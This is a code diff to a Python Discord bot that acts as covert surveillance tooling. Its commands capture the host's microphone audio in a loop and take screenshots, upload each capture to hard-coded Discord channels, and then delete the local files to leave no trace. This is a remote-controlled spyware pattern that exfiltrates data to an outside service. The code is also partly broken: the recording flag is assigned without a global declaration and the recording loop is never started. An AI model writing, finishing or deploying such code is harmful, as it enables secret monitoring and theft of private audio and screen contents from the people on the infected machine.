@@ -10,6 +10,7 @@ load_dotenv(".env")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=';', intents=intents)
+recording = False
 guild_id = "1198070162432200865"
 screenshot_channel = "1209205802032955413"
 microphone_channel = "1209237919592615937"
@@ -18,51 +19,47 @@ connect_channel = "1209247219874668638"
 microphone = Microphone()
 screenshot = Screenshot()
 
-@bot.command("sendMic")
-async def sendMic():
-    mic_path = microphone.name
-    if not mic_path:
-        print("Microphone path is empty.")
-        return
+async def record_mic():
+    while recording:
+        microphone.record()
+        mic_path = microphone.name
+        if not mic_path:
+            print("Microphone path is empty.")
+            return
 
-    guild = await bot.fetch_guild(guild_id)
-    channel = await guild.fetch_channel(screenshot_channel)
+        guild = await bot.fetch_guild(guild_id)
+        channel = await guild.fetch_channel(microphone_channel)
 
-    with open(mic_path, 'rb') as screenshot_file:
-        await channel.send(file=discord.File(screenshot_file, mic_path))
+        with open(mic_path, 'rb') as screenshot_file:
+            await channel.send(file=discord.File(screenshot_file, mic_path))
     
-    count = 0
-    determine = count + 1
-    microphone.record()
-    count += 1
-    
-    if count >= determine:
         mic_path = microphone.name   
         os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT
-        determine += 1
+
+@bot.command("sendMic")
+async def sendMic(ctx):
+    if recording == True:
+        recording = False
+    else:
+        recording = True
+        # ADFWAJJAGWJGA I NEED TO AWAIT IT SO IT DOESNT WORK
 
 @bot.command("sendScreen")
-async def sendScreen():
+async def sendScreen(ctx):
+    screenshot.printscreen()
     screenshot_path = screenshot.name
     if not screenshot_path:
-        print("Microphone path is empty.")
+        print("Screenshot path is empty.")
         return
 
     guild = await bot.fetch_guild(guild_id)
     channel = await guild.fetch_channel(screenshot_channel)
 
     with open(screenshot_path, 'rb') as screenshot_file:
-        await channel.send(file=discord.File(screenshot_file, screenshot_path))
-    
-    count = 0
-    determine = count + 1
-    screenshot.printscreen()
-    count += 1
+        await channel.send(file=discord.File(screenshot_file, screenshot_path)) 
 
-    if count >= determine:
-        screenshot_path = screenshot.name
-        os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
-        determine += 1
+    screenshot_path = screenshot.name
+    os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
 
 @bot.event
 async def on_ready():
